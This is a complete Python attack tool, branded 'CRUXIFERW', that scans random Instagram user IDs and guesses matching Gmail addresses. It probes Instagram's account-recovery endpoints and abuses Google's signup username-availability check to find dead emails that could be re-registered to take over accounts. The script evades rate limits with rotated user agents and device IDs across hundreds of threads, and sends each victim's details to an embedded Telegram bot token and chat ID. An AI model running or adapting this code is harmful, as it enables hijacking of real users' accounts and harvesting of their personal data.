import requests, uuid, time, random, json, re, os, sys, base64, secrets, threading
from threading import Thread
import requests, uuid, time, random, json, re, os, sys, base64, secrets, threading
from threading import Thread
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
import requests, uuid, time, random, json, re, os, sys, base64, secrets, threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter

MF, MUL, SU, FBL, FBH, WIS, NW, TMX = 0, 12, True, 20, 100, 180, 300, 400
em = None
h = g = tk = bd = lm = 0
inf = {}
_s = requests.session()
ST = datetime.now()
lt_chk = ""
lt_hit = ""
_tls = threading.local()

cid = None
tkn = None

P = "\033[38;2;221;175;255m"
C = "\033[38;2;164;218;255m"
M = "\033[38;2;255;183;213m"
L = "\033[38;2;190;255;222m"
D = "\033[38;2;255;211;178m"
Y = "\033[38;2;255;235;166m"
B = "\033[1m"
SI = "\033[2m"
R = "\033[0m"
G  = "\033[38;2;170;255;170m"
SK = "\033[38;2;255;170;200m"
CO = "\033[38;2;255;120;120m"
IC = "\033[38;2;150;200;255m"
W  = "\033[38;2;255;255;255m"

_UA = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Instagram 449.0.0.52.84 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
    "Instagram 448.0.0.47.90 Android (33/13; 420dpi; 1080x2340; xiaomi; M2101K7AG; miui; qcom; en_US; 631289712)",
]
_DI = ["CP/xygE=", "CP/xigE=", "CJ/xgE=", "CP/xyAE="]
_SC = ['"Chromium";v="139", "Not;A=Brand";v="99"',
       '"Chromium";v="138", "Not;A=Brand";v="99"',
       '"Chromium";v="137", "Not;A=Brand";v="99"']

def _ua(): return random.choice(_UA)
def _sh_headers():
    return {
        'sec-ch-ua': random.choice(_SC),
        'sec-ch-ua-mobile': "?1" if random.random() > .5 else "?0",
        'sec-ch-ua-platform': random.choice(['"Android"', '"Linux"', '"Windows"', '"macOS"']),
    }
def _mid(): return base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('=')
def _dv(): return str(uuid.uuid4())
def _fm(): return str(uuid.uuid4())
def _an(): return "android-" + secrets.token_hex(8)
def _rur(): return f'"HIL,{random.randint(10**9,10**10-1)},{random.randint(10**9,10**10-1)}:01fe{secrets.token_hex(32)}"'

def gs():
    if not hasattr(_tls, 'sess') or _tls.sess is None:
        s = requests.Session()
        ad = HTTPAdapter(pool_connections=16, pool_maxsize=32, max_retries=0)
        s.mount('https://', ad); s.mount('http://', ad)
        s.headers.update({
            'User-Agent': _ua(),
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            **_sh_headers(),
        })
        _tls.sess = s
    return _tls.sess

def rs():
    try:
        if hasattr(_tls, 'sess') and _tls.sess:
            _tls.sess.close()
    except Exception:
        pass
    _tls.sess = None
    return gs()

_tc = {'c': None, 'l': None, 'mt': 0.0}
_tl = threading.Lock()
TR = threading.Event()
_lht = [time.time()]

def _on_hit(): _lht[0] = time.time()

def _le(msg):
    n = time.time()
    if n - _le.last < 30: return
    _le.last = n
    try:
        with open('err.log', 'a', encoding='utf-8') as f:
            f.write(f"{datetime.now().isoformat()} | {msg}\n")
    except Exception:
        pass
_le.last = 0

DID = "28036671149327607"
UR = [(48000000001, 75000000000)]

def pb():
    os.system('cls' if os.name == 'nt' else 'clear')

def dp():
    try:
        sys.stdout.write("\033[H\033[?25l")
        hl = f"{C}│{R}  {G}✧ ʜɪᴛs{R}    {SI}❯{R} {M}{B}{h:<6}{R}  {SK}✧ ɢᴏᴏᴅ{R}   {SI}❯{R} {L}{B}{g:<6}{R}   {C}│{R}"
        bl = f"{C}│{R}  {CO}✧ ʙᴀᴅ{R}     {SI}❯{R} {CO}{B}{bd:<6}{R}  {L}✧ ᴛᴀᴋᴇɴ{R}  {SI}❯{R} {L}{B}{tk:<6}{R}   {C}│{R}"
        el = f"{C}│{R}  {IC}✧ ᴇᴍᴀɪʟ{R}   {SI}❯{R} {W}{(em if em else 'ɪᴅʟᴇ'):<46}{R}{C}│{R}"
        cl = f"{C}│{R}  {SK}✧ ᴄʜᴇᴄᴋ{R}   {SI}❯{R} {W}{(lt_chk if lt_chk else 'ᴡᴀɪᴛɪɴɢ...'):<46}{R}{C}│{R}"
        hl2 = f"{C}│{R}  {G}✧ ʟᴀsᴛ{R}    {SI}❯{R} {M}{B}{(lt_hit if lt_hit else 'ɴᴏɴᴇ ʏᴇᴛ'):<46}{R}{C}│{R}"
        s2  = f"{C}├{'─'*58}┤{R}"
        sl  = f"{C}│{R}  {G}●{R} {B}{M}ʀᴜɴɴɪɴɢ{R}  {D}{SI}ᴡᴏʀᴋᴇʀs:{R} {P}{NW}{R}  {D}{SI}ᴜᴘ:{R} {W}{str(datetime.now()-ST).split('.')[0]}{R}   {C}│{R}"
        b2  = f"{C}╰{'─'*58}╯{R}"
        title = f"{C}╭{'─'*58}╮{R}"
        sub   = f"{C}│{R} {B}{P}𓆩 𝐂𝐑𝐔𝐗𝐈𝐅𝐄𝐑𝐖 𓆪{R}{C}  {SI}{R}          {C}│{R}"
        sp    = f"{C}├{'─'*58}┤{R}"
        for x in (title, sub, sp, hl, bl, el, cl, hl2, s2, sl, b2):
            sys.stdout.write(f"\033[2K{x}\n")
        sys.stdout.flush()
    except Exception:
        pass

def gt():
    while True:
        try:
            url = "https://accounts.google.com/_/signup/validatepersonaldetails"
            params = {'hl': "en-GB", '_reqid': "46000", 'rt': "j"}
            payload = {
                'continue': "https://accounts.google.com/ManageAccount?nc=1",
                'f.req': '["AEThLlw3_SjR2r7ZvRrESUg3K4e9eBWmlOC4rULBmw9UAcZVy1db7ezAlKKPXcOeac71VE9Ducrl",null,null,null,null,0,0,"aesowns","aesowns",null,0,null,1,[],1]',
                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
                'cookiesDisabled': "false",
                'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
                'gmscoreversion': "null",
                'flowName': "GlifWebSignIn",
                'checkConnection': "youtube:301",
                'checkedDomains': "youtube",
                'pstMsg': "1",
                '': "",
            }
            headers = {
                'User-Agent': _ua(), **_sh_headers(),
                'x-same-domain': "1", 'google-accounts-xsrf': "1",
                'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
                'origin': "https://accounts.google.com",
                'x-client-data': random.choice(_DI),
                'sec-fetch-site': "same-origin", 'sec-fetch-mode': "cors", 'sec-fetch-dest': "empty",
                'referer': "https://accounts.google.com/createaccount?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
                'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN",
            }
            r = gs().post(url, params=params, data=payload, headers=headers, timeout=20)
            r.encoding = 'utf-8'
            tx = r.text
            if tx.startswith(")]}'"): tx = tx[4:]
            tl1 = json.loads(tx)[0][1][2]

            url = "https://accounts.google.com/_/signup/validatebasicinfo"
            params = {'hl': "en-GB", 'TL': tl1, '_reqid': "346000", 'rt': "j"}
            payload = {
                'continue': "https://accounts.google.com/ManageAccount?nc=1",
                'f.req': '["TL:' + tl1 + '",2015,4,15,2,null,null,0,null,null,0,0]',
                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
                'cookiesDisabled': "false",
                'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
                'gmscoreversion': "null",
                'flowName': "GlifWebSignIn",
                'checkConnection': "youtube:301",
                'checkedDomains': "youtube",
                'pstMsg': "1",
                '': "",
            }
            headers['referer'] = "https://accounts.google.com/signup/v2/birthdaygender?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL=" + tl1
            r = gs().post(url, params=params, data=payload, headers=headers, timeout=20)
            r.encoding = 'utf-8'
            tx = r.text
            if tx.startswith(")]}'"): tx = tx[4:]
            tl = json.loads(tx)[0][0][4].split("TL:")[1]
            with open("g.txt", "w", encoding='utf-8') as w:
                w.write(tl)
        except Exception as e:
            _le(f"gt: {e}")
        time.sleep(2)
Thread(target=gt, daemon=True).start()

def rp(usr):
    try:
        url = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
        headers = {
            'User-Agent': _ua(), 'x-csrftoken': "missing",
            'accept-language': "en-IN, en-US",
            'Content-Type': "application/x-www-form-urlencoded",
            'x-ig-app-id': "936619743392459",
            'x-requested-with': "XMLHttpRequest",
            'origin': "https://www.instagram.com",
            'referer': "https://www.instagram.com/accounts/password/reset/",
        }
        r = requests.post(url, data={'email_or_username': usr, 'flow': "fxcal"},
                          headers=headers, timeout=6)
        res = r.json()
        if res.get('status') == 'ok':
            return res.get('obfuscated_email') or res.get('contact_point')
        return None
    except Exception:
        return None

def bc(eml):
    global bd, g, lm
    if not eml: return False
    if SU and '_' in eml: return False
    url = "https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.caa.ar.search.async/"
    dv, fm, an = _dv(), _fm(), _an()
    bv = "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
    payload = {
        'params': '{"client_input_params":{"aac":"{\\"aac_init_timestamp\\":' + str(int(time.time())) +
                  ',\\"aacjid\\":\\"' + str(uuid.uuid4()) + '\\",\\"aaccs\\":\\"' + secrets.token_urlsafe(32) +
                  '\\"}","flash_call_permissions_status":{"READ_PHONE_STATE":"PERMANENTLY_DENIED","READ_CALL_LOG":"DENIED","ANSWER_PHONE_CALLS":"DENIED"},'
                  '"was_headers_prefill_available":0,"network_bssid":null,"sfdid":"","fetched_email_token_list":{},'
                  '"search_query":"' + eml + '","auth_secure_device_id":"","ig_oauth_token":[],"cloud_trust_token":null,'
                  '"was_headers_prefill_used":0,"sso_accounts_auth_data":[],"encrypted_msisdn":"","device_network_info":null,'
                  '"text_input_id":"akyuf0:61","zero_balance_state":null,"android_build_type":"release","accounts_list":[],'
                  '"is_oauth_without_permission":0,"ig_android_qe_device_id":"' + dv + '",'
                  '"gms_incoming_call_retriever_eligibility":"client_not_supported","search_screen_type":"email_or_username",'
                  '"is_whatsapp_installed":1,"lois_settings":{"lois_token":""},"ig_vetted_device_nonce":null,'
                  '"headers_infra_flow_id":"","fetched_email_list":[]},"server_params":{"event_request_id":"' + str(uuid.uuid4()) +
                  '","is_from_logged_out":0,"layered_homepage_experiment_group":null,"device_id":"' + an +
                  '","login_surface":"login_home","waterfall_id":"' + str(uuid.uuid4()) +
                  '","INTERNAL__latency_qpl_instance_id":6.3987980400102E13,"is_platform_login":0,"context_data":"",'
                  '"login_entry_point":"logged_out","INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"' + fm +
                  '","offline_experiment_group":"caa_iteration_v3_perf_ig_4","access_flow_version":"pre_mt_behavior",'
                  '"is_from_logged_in_switcher":0,"qe_device_id":"' + dv + '"}}',
        'bk_client_context': '{"bloks_version":"' + bv + '","styles_id":"instagram"}',
        'bloks_versioning_id': bv,
    }
    headers = {
        'User-Agent': _ua(), 'accept-language': "en-IN, en-US",
        'x-bloks-version-id': bv,
        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
        'x-ig-android-id': an, 'x-ig-app-id': "567067343352427",
        'x-ig-app-locale': "en_IN",
        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
        'x-ig-device-id': dv, 'x-ig-family-device-id': fm,
        'x-ig-timezone-offset': str(datetime.now().astimezone().utcoffset().total_seconds()),
        'x-mid': _mid(),
        'x-pigeon-rawclienttime': str(time.time()),
        'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
    }
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=8)
        r.encoding = 'utf-8'
        if eml in r.text:
            g += 1; dp(); return True
        elif 'Sorry, something' in r.text:
            lm += 1; dp(); return False
        else:
            bd += 1; dp(); return False
    except Exception:
        bd += 1; dp(); return False

def ga(usr, eml):
    global h, tk, lt_chk
    lt_chk = eml
    dp()
    try:
        with open("g.txt", "r", encoding='utf-8') as f:
            tl = f.read().strip()
    except Exception:
        time.sleep(.3); return
    if not tl:
        return
    url = "https://accounts.google.com/_/signup/usernameavailability"
    params = {'hl': "en-GB", 'TL': tl, '_reqid': "446000", 'rt': "j"}
    payload = {
        'continue': "https://accounts.google.com/ManageAccount?nc=1",
        'f.req': '["TL:' + tl + '","' + usr + '",0,0,1,null,1,2464]',
        'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
        'cookiesDisabled': "false",
        'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
        'gmscoreversion': "null",
        'flowName': "GlifWebSignIn",
        'checkConnection': "youtube:301",
        'checkedDomains': "youtube",
        'pstMsg': "1",
        '': "",
    }
    headers = {
        'User-Agent': _ua(), **_sh_headers(),
        'x-same-domain': "1", 'google-accounts-xsrf': "1",
        'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
        'origin': "https://accounts.google.com",
        'x-client-data': random.choice(_DI),
        'sec-fetch-site': "same-origin", 'sec-fetch-mode': "cors", 'sec-fetch-dest': "empty",
        'referer': "https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL=" + tl,
        'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN",
    }
    try:
        r = requests.post(url, params=params, data=payload, headers=headers, timeout=8)
        r.encoding = 'utf-8'
        if '"gf.uar",1' in r.text:
            h += 1; _on_hit(); dp()
            gm = gmk(usr)
            sb(tkn, cid, gm, usr, eml)
        else:
            tk += 1; dp()
    except Exception:
        tk += 1; dp()

def gmk(q):
    if not q or (SU and '_' in q): return None
    try:
        s = requests.Session()
        s.get('https://www.instagram.com/accounts/password/reset/', timeout=6)
        cf = s.cookies.get('csrftoken', '')
        headers = {
            'User-Agent': _ua(), 'X-CSRFToken': cf,
            'X-IG-App-ID': '936619743392459',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/password/reset/',
        }
        r = s.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/',
                   data={'email_or_username': q}, headers=headers, timeout=6)
        res = r.json()
        if res.get('status') == 'ok':
            return res.get('obfuscated_email') or res.get('contact_point')
        return None
    except Exception:
        return None

def sb(token, chat_id, gmail, usr, eml):
    global lt_hit
    d = inf.get(usr, {})
    fl = d.get('follower_count', 'N/A')
    fw = d.get('following_count', 'N/A')
    ps = d.get('media_count', 0) or 0
    fn = d.get('full_name', 'N/A') or 'N/A'
    bio = d.get('biography', 'N/A') or 'N/A'
    re_ = gmail if gmail else 'Not Found'
    bs = bio if len(str(bio)) <= 120 else str(bio)[:117] + "..."
    lt_hit = f"@{usr} | {eml} | {re_}"

    msg = (
        f"𓆩 <b>𝐇ɪᴛ — 𝐈ɴsᴛᴀɢʀᴀᴍ</b> 𓆪\n"
        f"╭─────── ୨୧ ───────╮\n"
        f"│ <b>ᴜsᴇʀɴᴀᴍᴇ</b>   : @{usr}\n"
        f"│ <b>ᴇᴍᴀɪʟ</b>      : {eml}\n"
        f"│ <b>ɴᴀᴍᴇ</b>       : {fn}\n"
        f"│ <b>ғᴏʟʟᴏᴡᴇʀs</b>  : {fl}\n"
        f"│ <b>ғᴏʟʟᴏᴡɪɴɢ</b>  : {fw}\n"
        f"│ <b>ᴘᴏsᴛs</b>      : {ps}\n"
        f"│ <b>ʀᴇsᴇᴛ</b>      : {re_}\n"
        f"│ <b>ᴘʀᴏғɪʟᴇ</b>    : instagram.com/{usr}\n"
        f"│ <b>ʙɪᴏ</b>        : {bs}\n"
        f"╰─────── ୨୧ ───────╯\n"
        f"𓆩 <b>𝐂𝐑𝐔𝐗𝐈𝐅𝐄𝐑𝐖</b> 𓆪"
    )
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
                      json={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"},
                      timeout=12)
    except Exception:
        try:
            with open('hits.txt', 'a', encoding='utf-8') as f:
                f.write(msg + "\n\n")
        except Exception:
            pass

def gtokens():
    while True:
        forced = False
        try:
            forced = TR.is_set()
            if forced: TR.clear()
            headers = {
                'User-Agent': _ua(), **_sh_headers(),
                'x-ig-app-id': "936619743392459",
                'origin': "https://www.instagram.com",
                'referer': "https://www.instagram.com/",
                'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                'accept-encoding': "gzip, deflate, br",
                'accept-language': "en-US,en;q=0.9",
                'cache-control': "no-cache", 'pragma': "no-cache",
                'sec-fetch-dest': "document", 'sec-fetch-mode': "navigate",
                'sec-fetch-site': "none", 'upgrade-insecure-requests': "1",
            }
            r = gs().get('https://www.instagram.com/', headers=headers, timeout=15)
            r.encoding = 'utf-8'
            csrf = r.cookies.get('csrftoken', '')
            html = r.text
            lsd = None
            m = re.search(r'"LSD",\[\],\{"token":"([^"]+)"', html)
            if m:
                lsd = m.group(1)
            else:
                sm = re.search(r'window\._sharedData\s*=\s*({.*?});', html, re.DOTALL)
                if sm:
                    try:
                        lsd = json.loads(sm.group(1)).get('config', {}).get('csrf_token')
                    except Exception:
                        pass
            if csrf and lsd:
                with _tl:
                    try:
                        with open("tokens.txt", "w", encoding='utf-8') as fd:
                            fd.write(f"{csrf}|{lsd}")
                        _tc['c'] = csrf; _tc['l'] = lsd
                        try: _tc['mt'] = os.path.getmtime('tokens.txt')
                        except Exception: _tc['mt'] = time.time()
                    except Exception:
                        pass
        except Exception as e:
            _le(f"gtokens: {e}")
        time.sleep(.8 if forced else 2)
Thread(target=gtokens, daemon=True).start()

FCS = "tPvqXDZm6bD62k-_0a2rRl"
FLS = "9CaKjXH_JGbfD4zZaTfZ8a"

def lt():
    with _tl:
        try:
            if os.path.exists('tokens.txt'):
                mt = os.path.getmtime('tokens.txt')
                if mt > _tc['mt']:
                    with open('tokens.txt', 'r', encoding='utf-8') as f:
                        p = f.read().strip().split("|")
                    if len(p) == 2 and p[0] and p[1]:
                        _tc['c'], _tc['l'], _tc['mt'] = p[0], p[1], mt
        except Exception:
            pass
        if _tc['c'] and _tc['l']:
            return _tc['c'], _tc['l']
    return FCS, FLS

def wd():
    while True:
        time.sleep(20)
        if time.time() - _lht[0] > WIS:
            TR.set()
            try:
                with open('health.log', 'a', encoding='utf-8') as f:
                    f.write(f"{datetime.now().isoformat()} idle - forced token refresh\n")
            except Exception:
                pass
Thread(target=wd, daemon=True).start()

he = ThreadPoolExecutor(max_workers=TMX)
_il = threading.Semaphore(TMX - 50)

def sh(fn, *a):
    _il.acquire()
    submitted = False
    try:
        def w():
            try:
                fn(*a)
            finally:
                _il.release()
        he.submit(w)
        submitted = True
    finally:
        if not submitted:
            _il.release()

def pp(usr):
    global em, h
    eg = usr + '@gmail.com'
    em = eg
    mk = rp(usr)
    if mk:
        h += 1; _on_hit(); dp()
        sb(tkn, cid, mk, usr, eg)
        return
    if not bc(eg):
        return
    ga(usr, eg)

RLM = ('checkpoint', 'rate limit', 'please wait', 'login_required', 'try again later', '429')

def gu(ir):
    cf = 0
    while True:
        s = gs()
        try:
            csrf, lsd = lt()
            cookies = {'rur': _rur()}
            headers = {
                'User-Agent': _ua(), **_sh_headers(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
                'x-ig-app-id': '936619743392459',
                'x-fb-lsd': lsd, 'x-csrftoken': csrf,
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
            }
            lo, hi = ir
            uid = random.randint(lo, hi)
            variables = {
                "enable_integrity_filters": True,
                "id": str(uid),
                "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
                "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
                "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
                "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": True,
                "__relay_internal__pv__PolarisShortDramaEnabledrelayprovider": True,
            }
            payload = {
                'lsd': lsd,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
                'variables': json.dumps(variables),
                'server_timestamps': 'true',
                'doc_id': DID,
            }
            r = s.post('https://www.instagram.com/api/graphql',
                       headers=headers, data=payload, cookies=cookies, timeout=10)
            if r.status_code == 429:
                cf += 1; TR.set(); time.sleep(min(20 * cf, 240)); continue
            tx = r.text
            low = tx.lower()
            if any(m in low for m in RLM):
                cf += 1; TR.set(); time.sleep(min(20 * cf, 240)); continue
            if tx.startswith('for'):
                tx = tx[9:]
            rj = json.loads(tx)
            u = rj.get('data', {}).get('user') or {}
            usr = u.get('username')
            fl = u.get('follower_count', 0)
            pk = u.get('pk')
            if not usr or not pk:
                cf += 1
                if cf > FBL: TR.set(); time.sleep(10)
                if cf > FBH: time.sleep(90); rs()
                continue
            cf = 0
            if fl >= MF and not (SU and '_' in usr) and len(usr) >= MUL:
                inf[usr] = u
                sh(pp, usr)
        except (requests.ConnectionError, requests.Timeout, requests.exceptions.ChunkedEncodingError):
            cf += 1; rs()
            if cf > FBL: time.sleep(10)
            if cf > FBH: time.sleep(60)
        except Exception as e:
            cf += 1
            _le(f"gu: {e}")

if __name__ == "__main__":
    pb()
    print(f"{C}╭───────────────────────╮{R}")
    print(f"{C}│{R}  {P}{B}𓆩 𝐁ᴏᴛ 𝐂ᴏɴғɪɢ 𓆪{R}                     {C}│{R}")
    print(f"{C}├────────────────────────┤{R}")
    print(f"{C}│{R}  {L}୨୧ ᴇɴᴛᴇʀ ᴄʜᴀᴛ ɪᴅ{R}                     {C}│{R}")
    print(f"{C}╰────────────────────────╯{R}")
    cid = "7480132504"

    print(f"\n{C}╭──────────────────────╮{R}")
    print(f"{C}│{R}  {P}{B}𓆩 𝐁ᴏᴛ 𝐂ᴏɴғɪɢ 𓆪{R}                     {C}│{R}")
    print(f"{C}├────────────────────────┤{R}")
    print(f"{C}│{R}  {L}୨୧ ᴇɴᴛᴇʀ ʙᴏᴛ ᴛᴏᴋᴇɴ{R}                   {C}│{R}")
    print(f"{C}╰────────────────────────╯{R}")
    tkn = "8270530633:AAFs1hD5QJt0F0qRnz5yUXAcIipxo3lED1c"

    os.system('cls' if os.name == 'nt' else 'clear')

    wc = []
    pr = NW // len(UR)
    for r in UR:
        for _ in range(pr):
            wc.append(r)
    while len(wc) < NW:
        wc.append(random.choice(UR))

    with ThreadPoolExecutor(max_workers=len(wc)) as ex:
        for c in wc:
            ex.submit(gu, c)
        while True:
            time.sleep(1)
            dp()